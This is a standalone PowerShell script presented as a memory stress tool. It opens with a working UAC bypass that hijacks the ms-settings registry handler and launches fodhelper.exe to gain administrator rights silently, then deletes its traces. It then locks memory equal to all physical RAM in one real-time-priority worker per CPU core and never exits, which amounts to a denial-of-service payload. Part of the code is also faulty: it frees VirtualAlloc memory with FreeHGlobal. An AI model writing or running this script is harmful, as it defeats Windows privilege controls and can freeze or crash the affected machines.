# Self-elevate via UAC bypass (unchanged)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $registryPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    $scriptPath = "powershell.exe -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
    
    New-Item -Path $registryPath -Force | Out-Null
    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $registryPath -Name "(Default)" -Value $scriptPath -Force | Out-Null
    
    Start-Process "fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 2
    Remove-Item -Path $registryPath -Recurse -Force
    exit
}

Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class MemLock {
    [DllImport("kernel32.dll")]
    public static extern bool VirtualLock(IntPtr lpAddress, UIntPtr dwSize);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, 
        uint flAllocationType, uint flProtect);
}
"@

# --- System Configuration ---
$physicalMem = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum
$targetSize = $physicalMem  # 100% of physical RAM
$chunkSize = 2MB  # Optimal allocation size
$lockInterval = 500MB  # Lock every 500MB allocated

# --- Memory Stress Core Function ---
function Invoke-MemoryStress {
    $totalLocked = 0
    $lockedBlocks = [System.Collections.Generic.List[IntPtr]]::new()

    try {
        while ($totalLocked -lt $targetSize) {
            $alloc = [MemLock]::VirtualAlloc(
                [IntPtr]::Zero,
                [UIntPtr][uint64]$chunkSize,
                0x1000,  # MEM_COMMIT
                0x04     # PAGE_READWRITE
            )
            
            if ($alloc -eq [IntPtr]::Zero) {
                throw "VirtualAlloc failed"
            }

            if (-not [MemLock]::VirtualLock($alloc, [UIntPtr][uint64]$chunkSize)) {
                throw "VirtualLock failed"
            }

            $lockedBlocks.Add($alloc)
            $totalLocked += $chunkSize
            
            if ($totalLocked % $lockInterval -eq 0) {
                Write-Host "Locked $(($totalLocked/1MB)) MB"
            }
        }
        
        Write-Host "Memory pressure stabilized at $($totalLocked/1GB) GB"
        while ($true) { Start-Sleep -Seconds 60 }
    }
    finally {
        foreach ($block in $lockedBlocks) {
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($block)
        }
    }
}

# --- Process Priority Configuration ---
try {
    $proc = Get-Process -Id $PID
    $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::RealTime
    [System.Threading.Thread]::CurrentThread.Priority = [System.Threading.ThreadPriority]::Highest
    [System.Runtime.GCSettings]::LatencyMode = [System.Runtime.GCLatencyMode]::SustainedLowLatency
}
catch {
    Write-Warning "Priority elevation failed: $_"
}

# --- Launch Stress Workers ---
$threadCount = [Environment]::ProcessorCount
$jobs = @()

1..$threadCount | ForEach-Object {
    $jobs += Start-ThreadJob -ScriptBlock ${function:Invoke-MemoryStress} -ThrottleLimit 100
}

Write-Host "Started $threadCount memory stress workers"
$jobs | Wait-Job | Out-Null
